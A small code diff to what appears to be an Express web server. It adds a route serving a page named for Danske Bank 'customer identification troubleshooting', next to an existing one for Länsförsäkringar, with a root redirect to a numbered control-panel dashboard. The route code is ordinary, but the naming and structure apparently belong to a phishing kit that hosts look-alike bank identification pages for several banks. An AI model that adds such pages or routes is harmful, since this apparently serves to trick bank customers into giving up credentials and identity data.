@@ -205,6 +205,10 @@ app.get('/Lansforsakringarfelsokningskundidentifieringkund98721311', (req, res) 
     res.sendFile(path.join(__dirname, 'public', 'Lansforsakringarfelsokningskundidentifieringkund98721311.html'));
 });
 
+app.get('/Danskebankfelsokningskundidentifieringkund98721311', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'Danskebankfelsokningskundidentifieringkund98721311.html'));
+});
+
 // Add a root route
 app.get('/', (req, res) => {
     res.redirect('/dashboard_98721311_control_panel.html');
